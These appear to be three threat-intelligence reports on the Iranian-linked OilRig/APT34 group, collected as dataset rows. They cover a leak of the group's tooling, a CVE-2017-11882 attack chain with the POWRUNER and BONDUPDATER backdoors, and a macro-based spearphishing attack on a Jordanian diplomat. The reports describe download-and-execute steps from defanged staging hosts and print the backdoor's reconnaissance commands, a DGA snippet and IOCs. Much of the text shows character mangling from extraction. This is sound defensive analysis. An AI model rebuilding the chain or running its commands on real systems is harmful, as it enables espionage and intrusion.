a tenuous relationship at best and does not indicate that the OilRig group is the one executing the DNSpionage campaign, but with the combination of the use of DeltaHost and IPs belonging to a fairly small range, there may be reason to believe that these are related to some extent. Figure 21 is a screenshot of a C2 server panel for Glimpse, which we track using the name BONDUPDATER. This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH. If we again assume the accuracy of the time indicated in the ﬁlename, this would indicate that no compromised system had checked in since as far out as 71 days. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 20 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 21. Screenshot in leak of RDP session with a server running the Glimpse C2 Conclusion This data dump has provided a rare and unusual perspective into the behind-the-scenes activity in an adversary’s operations. It is important to understand that although we are able to validate the backdoors and webshells provided in the dataset as consistent with previously researched OilRig toolsets, in general we are unable to validate the origins of the entirety of the dataset and cannot conﬁrm nor deny that the data has not been manipulated in some manner. It is certainly possible that the data dump did indeed originate from a whistleblower, but it is just as likely that a third party was able to extract this data. Looking at the data dump as a whole though, the targeting and TTPs are consistent with behaviors we have generally associated with OilRig in the past. Assuming the data in the dump is accurate, it also shows the global reach of the OilRig threat group, which generally is assumed to operate primarily in the Middle East. The disparity in regions and industries for organizations potentially aﬀected or compromised by OilRig is an excellent example of why organizations regardless of region or industry should always maintain situational awareness of adversaries, their activities, and be prepared to defend against any attack. Indicators of Compromise Domains Myleftheart[.]com office365-management[.]com msoffice-cdn[.]com Poison Frog PS1 ﬁles 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd999 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea330436c IPs 185.36.191[.]31 185.161.209[.]57 185.161.210[.]25 164.132.67[.]216 212.32.226[.]245 https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 21 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 142.234.157[.]21 193.111.152[.]13 185.162.235[.]106 185.162.235[.]29 185.162.235[.]121 OopsIE payload 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336 Back to top T A G S BONDUPDATER Evasive Serpens OilRig OopsIE TwoFace Threat Research Center Next: BabyShark Malware Part Two – Attacks Continue Using KimJongRAT and PCRat Related Resources T H R E A T A C T O R G R O U P S T H R E A T R E S E A R C H T H R E A T R E S E A R C H Fighting Ursa Luring Targets With Car for Sale Advanced Persistent Threat APT28 Fancy Bear Scam Attacks Taking Advantage of the Popularity of the Generative AI Wave ChatGPT GenAI Cybersquatting Accelerating Analysis When It Matters Remote Access Trojan Memory detection Redline infostealer Read now Read now https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 22 di 24"
oilrig,cti-hal,846454187550,G0049,"New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit December 7, 2017 Mandiant Wri!en by: Manish Sardiwal, Vincent Cannon, Nalani Fraser, Yogesh Londhe, Nick Richard, Jacqueline O'Leary Less than a week a""er Microso"" issued a patch for CVE-2017- 11882 on Nov. 14, 2017, FireEye observed an a!acker using an exploit for the Microso"" O#ce vulnerability to target a government organization in the Middle East. We assess this activity was carried out by a suspected Iranian cyber espionage threat group, whom we refer to as APT34, using a custom PowerShell backdoor to achieve its objectives. We believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance e$o%s to bene&t Iranian nation-state interests and has been operational since at least 2014. This threat group has conducted broad targeting across a variety of industries, including &nancial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 1 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 infrastructure, and targeting that aligns with nation-state interests. APT34 uses a mix of public and non-public tools, o""en conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics. In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled a!achments to distribute POWBAT malware. We now a!ribute that campaign to APT34. In July 2017, we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware. The backdoor was delivered via a malicious .%f &le that exploited CVE-2017-0199. In this latest campaign, APT34 leveraged the recent Microso"" O#ce vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER. The full repo% on APT34 is available to our MySIGHT customer community. APT34 loosely aligns with public repo%ing related to the group ""OilRig"". As individual organizations may track adversaries using varied data sets, it is possible that our classi&cations of activity may not wholly align. CVE-2017-11882: Microso! O""ce Stack Memory Corruption Vulnerability CVE-2017-11882 a$ects several versions of Microso"" O#ce and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory. The vulnerability was patched by Microso"" on Nov. 14, 2017. A full proof of concept (POC) was publicly released a week later by the repo%er of the vulnerability. The vulnerability exists in the old Equation Editor (EQNEDT32.EXE), a component of Microso"" O#ce that is used to inse% and evaluate mathematical formulas. The Equation Editor is embedded in O#ce documents using object linking and embedding (OLE) technology. It is created as a separate process instead of child process of O#ce applications. If a cra""ed formula is passed to the Equation Editor, it does not check the data length properly while copying the data, which results in stack memory corruption. As the EQNEDT32.exe is compiled using an older compiler and does not suppo% address space layout randomization (ASLR), a technique https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 2 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 that guards against the exploitation of memory corruption vulnerabilities, the a!acker can easily alter the 'ow of program execution. Analysis APT34 sent a malicious .%f &le (MD5: a0e6933f4e0497269620f44a083b2ed4) as an a!achment in a malicious spear phishing email sent to the victim organization. The malicious &le exploits CVE-2017-11882, which corrupts the memory on the stack and then proceeds to push the malicious data to the stack. The malware then overwrites the function address with the address of an existing instruction from EQNEDT32.EXE. The overwri!en instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function. Figure 1: Disassembly of overwri!en function address A""er exploitation, the ‘WinExec’ function is successfully called to create a child process, “mshta.exe”, in the context of current logged on user. The process “mshta.exe” downloads a malicious script from hxxp://mumbai-m[.]site/b.txt and executes it, as seen in Figure 2. Figure 2: A!acker data copied to corrupt stack bu""er Execution Work#ow The malicious script goes through a series of steps to successfully execute and ultimately establish a connection to the command and control (C2) server. The full sequence of events sta%ing with the exploit document is illustrated in Figure 3. Figure 3: CVE-2017-11882 and POWRUNER a!ack sequence 1. The malicious .%f &le exploits CVE-2017-11882. 2. The malware overwrites the function address with an existing https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 3 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 instruction from EQNEDT32.EXE. 3. The malware creates a child process, “mshta.exe,” which downloads a &le from: hxxp://mumbai-m[.]site/b.txt. 4. b.txt contains a PowerShell command to download a dropper from: hxxp://dns-update[.]club/v.txt. The PowerShell command also renames the downloaded &le from v.txt to v.vbs and executes the script. 5. The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\ProgramData\Windows\Microso""\java\ 6. v.vbs uses Ce%Util.exe, a legitimate Microso"" command-line program installed as pa% of Ce%i&cate Services, to decode the base64-encoded &les hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory. 7. cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence. 8. GoogleUpdateschecker.vbs is executed a""er sleeping for &ve seconds. 9. cUpdateCheckers.bat and *.base are deleted from the staging directory. Figure 4 contains an excerpt of the v.vbs script pe%aining to the Execution Work'ow section. Figure 4: Execution Work#ow Section of v.vbs A""er successful execution of the steps mentioned in the Execution Work'ow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts. These PowerShell scripts are &nal stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and pe3orm additional malicious activities. hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server. https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 4 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 POWRUNER is executed every minute by the Task Scheduler. Figure 5 contains an excerpt of the POWRUNER backdoor. Figure 5: POWRUNER PowerShell script hUpdateCheckers.ps1 POWRUNER begins by sending a random GET request to the C2 server and waits for a response. The server will respond with either “not_now” or a random 11-digit number. If the response is a random number, POWRUNER will send another random GET request to the server and store the response in a string. POWRUNER will then check the last digit of the stored random number response, interpret the value as a command, and pe3orm an action based on that command. The command values and the associated actions are described in Table 1. Command Description Action 0 1 2 Server response Execute batch string contains commands and send batch commands results back to server Server response string is a &le path Check for &le path and upload (PUT) the &le to server Server response Check for &le path and string is a &le path download (GET) the &le Table 1: POWRUNER commands A""er successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution. The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system. POWRUNER will send the captured screenshot image &le to the C2 server if the “&leupload” command is issued. Figure 6 shows the PowerShell “Get-Screenshot” function sent by the C2 server. Figure 6: PowerShell Screenshot Functionality https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 5 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 dUpdateCheckers.ps1 (BONDUPDATER) One of the recent advancements by APT34 is the use of DGA to generate subdomains. The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server. DGA Implementation Figure 7 provides a breakdown of how an example domain (456341921300006B0C8B2CE9C9B007.mumbai-m[.]site) is generated using BONDUPDATER’s custom DGA. Figure 7: Breakdown of subdomain created by BONDUPDATER 1. This is a randomly generated number created using the following expression: $rnd = -join (Get-Random -InputObject (10..99) -Count (%{ Get-Random -InputObject (1..6)})); 2. This value is either 0 or 1. It is initially set to 0. If the &rst resolved domain IP address sta%s with 24.125.X.X, then it is set to 1. 3. Initially set to 000, then incremented by 3 a""er every DNS request 4. First 12 characters of system UUID. 5. “B007” hardcoded string. 6. Hardcoded domain “mumbai-m[.]site” BONDUPDATER will a!empt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution: 1. Create a temporary &le in %temp% location The &le created will have the last two octets of the resolved IP addresses as its &lename. 2. BONDUPDATER will evaluate the last character of the &le name and pe3orm the corresponding action found in Table 2. Character Description https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 6 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 0 1 2 File contains batch commands, it executes the batch commands Rename the temporary &le as .ps1 extension Rename the temporary &le as .vbs extension Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation. Figure 8: Domain Generation Algorithm Some examples of the generated subdomains observed at time of execution include: 143610035BAF04425847B007.mumbai-m[.]site 835710065BAF04425847B007.mumbai-m[.]site 376110095BAF04425847B007.mumbai-m[.]site Network Communication Figure 9 shows example network communications between a POWRUNER backdoor client and server. Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response. As the response is a random number that ends with ‘0’, POWRUNER sends another random GET request to receive an additional command string. The C2 server sends back Base64 encoded response. If the server had sent the string “not_now” as response, as shown in Figure 10, POWRUNER would have ceased any fu%her requests and terminated its execution. https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 7 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 Figure 10: Example ""not now"" server response Batch Commands POWRUNER may also receive batch commands from the C2 server to collect host information from the system. This may include information about the currently logged in user, the hostname, network con&guration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data. An example batch command is provided in Figure 11. Figure 11: Batch commands sent by POWRUNER C2 server Additional Use of POWRUNER / BONDUPDATER APT34 has used POWRUNER and BONDUPDATER to target Middle East organizations as early as July 2017. In July 2017, a FireEye Web MPS appliance detected and blocked a request to retrieve and install an APT34 POWRUNER / BONDUPDATER downloader &le. During the same month, FireEye observed APT34 target a separate Middle East organization using a malicious .%f &le (MD5: 63D66D99E46FB93676A4F475A65566D8) that exploited CVE- 2017-0199. This &le issued a GET request to download a malicious &le from: hxxp://94.23.172.164/dupdatechecker.doc. As shown in Figure 12, the script within the dupatechecker.doc &le a!empts to download another &le named dupatechecker.exe from the same server. The &le also contains a comment by the malware author that appears to be an apparent taunt to security researchers. Figure 12: Contents of dupdatechecker.doc script The dupatechecker.exe &le (MD5: C9F16F0BE8C77F0170B9B6CE876ED7FB) drops both https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 8 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 BONDUPDATER and POWRUNER. These &les connect to proxychecker[.]pro for C2. Outlook and Implications Recent activity by APT34 demonstrates that they are capable group with potential access to their own development resources. During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE- 2017-0199 and CVE-2017-11882) to target organizations in the Middle East. We assess that APT34’s e$o%s to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group’s commitment to pursing strategies to deter detection. We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to entities in the Middle East region. IOCs Filename / Domain / IP Address CVE-2017-11882 exploit document MD5 Hash or Description A0E6933F4E0497269620F44A083B2ED4 b.txt 9267D057C065EA7448ACA1511C6F29C7 v.txt/v.vbs B2D13A336A3EB7BD27612BE7D4E334DF dUpdateCheckers.base 4A7290A279E6F2329EDD0615178A11FF hUpdateCheckers.base 841CE6475F271F86D0B5188E4F8BC6DB cUpdateCheckers.bat 52CA9A7424B3CC34099AD218623A0979 dUpdateCheckers.ps1 BBDE33F5709CB1452AB941C08ACC775E hUpdateCheckers.ps1 247B2A9FCBA6E9EC29ED818948939702 GoogleUpdateschecker.vbs C87B0B711F60132235D7440ADD0360B0 https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 9 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 hxxp://mumbai-m[.]site POWRUNER C2 hxxp://dns-update[.]club Malware Staging Server CVE-2017-0199 exploit document 63D66D99E46FB93676A4F475A65566D8 94.23.172.164:80 Malware Staging Server dupdatechecker.doc D85818E82A6E64CA185EDFDDBA2D1B76 dupdatechecker.exe C9F16F0BE8C77F0170B9B6CE876ED7FB proxycheker[.]pro C2 46.105.221.247 148.251.55.110 Has resolved mumbai-m[.]site & hpserver[.]online Has resolved mumbai-m[.]site and dns- update[.]club 185.15.247.147 Has resolved dns-update[.]club 145.239.33.100 Has resolved dns-update[.]club 82.102.14.219 Has resolved ns2.dns-update[.]club & hpserver[.]online & anypo%als[.]com v7-hpserver.online.hta E6AC6F18256C4DDE5BF06A9191562F82 dUpdateCheckers.base 3C63BFF9EC0A340E0727E5683466F435 hUpdateCheckers.base EEB0FF0D8841C2EBE643FE328B6D9EF5 cUpdateCheckers.bat FB464C365B94B03826E67EABE4BF9165 dUpdateCheckers.ps1 635ED85BFCAAB7208A8B5C730D3D0A8C hUpdateCheckers.ps1 13B338C47C52DE3ED0B68E1CB7876AD2 googleupdateschecker.vbs DBFEA6154D4F9D7209C1875B2D5D70D5 https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 10 di 12 New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit | Google Cloud Blog 07/08/24, 11:43 hpserver[.]online C2 v7-anypo%als.hta EAF3448808481FB1FDBB675BC5EA24DE dUpdateCheckers.base 42449DD79EA7D2B5B6482B6F0D493498 hUpdateCheckers.base A3FCB4D23C3153DD42AC124B112F1BAE dUpdateCheckers.ps1 EE1C482C41738AAA5964730DCBAB5DFF hUpdateCheckers.ps1 E516C3A3247AF2F2323291A670086A8F anypo%als[.]com C2 Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence UNC4393 Goes Gently into the SILENTNIGHT APT45: North Korea’s Digital Military Machine By Mandiant • 21-minute By Mandiant • 5-minute read read APT41 Has Arisen From the DUST By Mandiant • 28-minute read Whose Voice Is It Anyway? AI- Powered Voice Spoo!ng for Next- Gen Vishing A""acks By Mandiant • 8-minute read Follow us https://cloud.google.com/blog/topics/threat-intelligence/targeted-attack-in-middle-east-by-apt34/ Pagina 11 di 12"
oilrig,cti-hal,5b5c09875540,G0049,"Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 FORTIGUARD LABS THREAT RESEARCH Please Confirm You Received Our APT By Fred Gutierrez | May 11, 2022 Because we are constantly monitoring the threat landscape, FortiGuard Labs has the opportunity to see many unique and novel attacks. Recently, one of our sample collectors was able to find one such incident. It began with a spearphishing email to a diplomat in Jordan. Like many of these attacks, the email contained a malicious attachment. However, the attached threat was not a garden-variety malware. Instead, it had the capabilities and techniques usually associated with advanced persistent threats (APTs). Based on the techniques used in this attack, it appears to be another campaign launched by APT34. The rest of this blog will analyze the attack chain associated with this email and the traits that set it apart from average malware, such as DNS tunneling and stateful programming. Affected Platforms: Microsoft Windows Impacted Users: Targeted Windows users Impact: Collects sensitive information from the compromised machine Severity Level: Medium Spearphishing Email This spearphishing attack targeted a Jordanian diplomat, with the sender pretending to be a colleague from the IT department of the same governmental organization. Looking at the headers of the email, we can determine that the email originated from outside the organization. But while it came from an external email address, it used the first and last name of an employee in the IT department. The alert diplomat decided to forward this to the real employee. This may have been done to verify the authenticity of the original email or, more likely, for further analysis within the IT department. As suggested in Figure 1. Spearphishing email https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 1 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 the email body, the attached Excel file contained a confirmation form for the targeted diplomat to fill out. For those technically inclined, the next few sections break down the “how” and “what happened” of this malware. Other readers should feel free to skip to the “C2 Servers” section for details on how to protect your organization. Malicious Excel File The attached Excel file contains a malicious VBA ]Visual Basic Application) macro as opposed to the Excel MacroSheets that other malware such as Emotet and QBot typically use. In many cases, a malicious macro may install some sort of stager, such as those deployed by Cobalt Strike or Metasploit. In other cases, the macro may use living-off-the-land techniques to download and execute a second-stage binary. Another option a macro may use is to simply drop and run a malicious binary. In this attack, the macro uses the latter option. This, however, was where similarities to other phishing attacks end. Figure 2. Macro opening One of the unique techniques seen in this macro is the toggling of sheet visibility. In most attacks involving Excel, no hidden sheets are used. And in those cases where hidden sheets are used, the hidden sheet typically holds the malicious code. In this attack, however, the visibility of two sheets is quickly switched as soon as the workbook is opened. One possible reason for this may be as an anti-emulation technique. Emulators (such as the freely available ViperMonkey) may or may not support all Excel functionality, such as the hiding of sheets. Incidentally, lines 16 and 17 are commented out. Perhaps these lines were used for testing purposes or were part of a different lure, one in which TeamViewer (remote access and control software used for device maintenance) was used. The astute observer may have also noticed line 25 in the previous image. Line 25 calls a function that contacts the C2 server. Figure 3. C2 contact Unlike most malicious macros, this one uses WMI ]Windows Management Instrumentation) to ping the C2 server instead of a more commonly used tool, such as PowerShell or CMD. Furthermore, this function is called multiple times during macro execution. It basically works as a state monitor to keep track of what’s happening during the attack. The tMsg variable changed during different stages of the attack, allowing the attackers to view their network logs to see the state of their macro. The rds variable is a random four-digit number, with the same four digits used consistently throughout the macro state check-in process. C2 Macro State https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 2 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 qwzbabz[four- Macro start digits].joexpediagroup[.]com qwzbbbz[four- Connected successfully to task scheduler digits].joexpediagroup[.]com qwzbaez[four- Successfully created malicious PE ﬁle digits].joexpediagroup[.]com qwzbbez[four- Successfully created XML conﬁg ﬁle digits].joexpediagroup[.]com qwzbcez[four- Successfully created signed Microsoft PE ﬁle digits].joexpediagroup[.]com qwzbdez[four- Double-check malicious PE ﬁle was created digits].joexpediagroup[.]com qwzbeez[four- Successful manual execution of malicious PE digits].joexpediagroup[.]com ﬁle qwzafzz[four- Begin task scheduler conﬁguration for digits].joexpediagroup[.]com persistence qwzbbfz[four- Successfully created scheduled task digits].joexpediagroup[.]com Figure 4. Table of states As alluded to in the table above, the macro has the capability to create three files. A malicious PE file was created as %LocalAppData%\MicrosoftUpdate\update.exe. A configuration file was created as %LocalAppData%\MicrosoftUpdate\update.exe.config. And the third file, %LocalAppData%\MicrosoftUpdate\Microsoft.Exchange.WebServices.dll, was signed and clean. While the malware authors decided to store these three files inside the Excel file, they again chose to do so in a way that is not commonly seen. Three user forms are stored inside the Excel file. Each user form has a label, and each label has a caption. As seen in the image above, the caption Figure 5. Form caption https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 3 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 contains base64 encoded data. Form1 contains the malicious update.exe file. Form2 contains the configuration file. And Form3 contains the clean Microsoft file. We will explore these files further later in this blog. The malware authors also used the Excel macro to create a persistence method for their update.exe file. They accomplished this by setting a scheduled task. Figure 6. Scheduled task The task is named MicrosoftUpdate and repeats every 4 hours. The macro also uses deprecated IdleSettings properties, such as Duration (which starts the task only if the computer has been idle for ten minutes) and WaitTimeout (which determines how long to wait for an idle condition). This task was set to allow 20 days to complete. Taking into account the date of the email and assuming the task ran immediately, the task would run until at least May 16, 2022. In addition to the visibility switch technique described earlier, a second technique was also seen in this macro to possibly avoid automated analysis. This macro does this by checking for the existence of a mouse. If a mouse is not connected, the macro does not create any of the three files. There are a couple of instances where a mouse would not be attached to a computer. First, a mouse is not necessarily needed if the computer is controlled remotely. The only mouse needed would be installed on the controlling computer. And second, a mouse is not needed if an analysis machine is simply processing and emulating Office files. A script can be created to automatically perform all the actions necessary without a mouse. As far as malicious macros go, this one contains several techniques not normally seen in most attacks. This suggests that more time and care have been given to developing this portion of the attack. In the next section, we will look at the files that were created by this macro. Dropped Files As explained earlier, this malicious Excel macro includes the ability to create three files. In this section, we will look at them individually, starting with the two benign files. A signed file was embedded inside the Excel file and dropped to the following location: %LocalAppData%\MicrosoftUpdate\Microsoft.Exchange.WebServices.dll. Another innocuous file was dropped as %LocalAppData%\MicrosoftUpdate\update.exe.config. Its contents are to be used as configuration data. Here are the contents after decoding: The third file is the actual malware. It was created in the same location as the two previously dropped files, as %LocalAppData%\MicrosoftUpdate\update.exe. It was a .NET binary and contained the main payload. Figure 7. Config data This malware binary was certainly developed by the same group that created the Excel macro, as there are similarities between the two. One similarity deals with the idea of states and the tracking of what was happening at any given point in time within the execution flow. Since .NET is a more robust programming language than the scripting nature of VBA, the malware binary has a much easier way of keeping state. https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 4 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 The figure above shows a partial state dictionary defined by the malware. Depending on the execution flow and what state the malware lands in, certain delays are introduced. Figure 8. Dictionary of states Figure 9. Delay times in milliseconds These delays are executed by calling the Sleep() function. In .NET, Sleep() accepts values in milliseconds. In certain cases, for example, from DelayMinAlive to DelayMaxAlive, the malware can sleep anywhere from 6 to 8 hours! While this malware sleeps in certain program states, other program states require it to contact the C2 server. Like the Excel macro, it contacts seemingly random subdomains. However, in actuality, it uses a domain generation algorithm ]DGAk to calculate a subdomain. https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 5 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 Figure 10. DGA The malware constructs the DGA by first randomly assigning a value to _AgentID. This value is then fed as a seed into the RandomMersenneTwister function, highlighted above. It then performs further calculations using the haruto string as well as the strings found in the CharsDomain and CharsCounter variables. Once a subdomain string is generated, the malware randomly chooses one of three domains to concatenate with (joexpediagroup[.]com, asiaworldremit[.]com, or uber-asia[.]com). Once the URL is generated, the next step the malware takes is to check for the C2 server’s DNS data. Figure 11. DNS When DNS is queried for a domain, a DNS server returns an IP address that points to the requested domain. The malware then checks the first octet of the IP address to ensure the value is at least 128 to be considered valid. Perhaps this is a way for the malware to avoid internal IP addresses, such as the 127p.q0p.q0p.q1 local loopback address or the 10p.q0p.q0p.q0 internal subnet. Lines 260r261 are used to define the byte array DnsClass._ReceiveData with a size defined by the remaining octets. For example, a DNS test server is set up to return the IP address 192p.q5p.q4p.q3 for any DNS requests. That means the byte array has a size of 0s050403. Later in the malware’s execution flow, this data from the DNS request is used to define TaskClass properties. https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 6 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 Specifically on line 245, TaskClass.ListData is set to the received data from the DNS request. In the end, this basically means that this malware is receiving tasks inside a DNS response. Apparently, this malware uses DNS tunneling to communicate with its C2. APT34 has historically used DNS Figure 12. DNS tunneling for communications as well. Several types of tasks are defined for this malware. This malware has the ability to take a DNS response and create an arbitrary file on the infected machine if that was the task the malware authors wanted to perform. File and CompressedFile are task types used to create a file. The remaining task types are used to send backdoor commands to the malware. These backdoor commands are meant to be executed through PowerShell or through the Windows CMD interpreter. The following table lists supported commands. Figure 13. Task types Command Interpreter Payload 1 2 3 4 5 PS PS Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress Get-NetNeighbor -AddressFamily IPv4 | Select-Object ""IPADDress"" CMD whoami PS [System.Environment]::OSVersion.VersionString CMD net user https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt Pagina 7 di 14 Please Confirm You Received Our APT | FortiGuard Labs 07/08/24, 10:25 7 8 9 10 11 PS PS PS Get-ChildItem -Path ""C:\Program Files"" | Select-Object Name Get-ChildItem -Path 'C:\Program Files (x86)' | Select-Object Name Get-ChildItem -Path 'C:' | Select-Object Name CMD hostname PS Get-NetTCPConnection | Where-Object {$_.State -eq ""Established""} | Select-Object ""LocalAddress"", ""LocalPort"", ""RemoteAddress"", ""RemotePort"" 12 PS $(ping -n 1 10.65.4.50 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.4.51 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.65.65 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.53.53 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.21.200 | ﬁndstr /i ttl) -eq $null 13 PS nslookup ise-posture.mofagov.gover.local | ﬁndstr /i Address;nslookup webmail.gov.jo | ﬁndstr /i Address 14 PS $(ping -n 1 10.10.21.201 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.201 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.202 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.24.200 | ﬁndstr /i ttl) - eq $null 15 PS $(ping -n 1 10.10.10.4 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.50.10 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.22.50 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | ﬁndstr /i ttl) -eq $null 16 PS $(ping -n 1 10.65.51.11 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.6.1 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.52.200 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.6.3 | ﬁndstr /i ttl) -eq $null 17 PS $(ping -n 1 10.65.45.18 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.28.41 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.36.13 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.51.10 | ﬁndstr /i ttl) -eq $null 18 PS $(ping -n 1 10.10.22.42 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.23.200 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.10.19.50 | ﬁndstr /i ttl) -eq $null 19 PS $(ping -n 1 10.65.45.3 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.4.52 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 10.65.31.155 | ﬁndstr /i ttl) -eq $null;$(ping -n 1 ise- posture.mofagov.gover.local | ﬁndstr /i ttl) -eq $null 20 21 22 PS PS 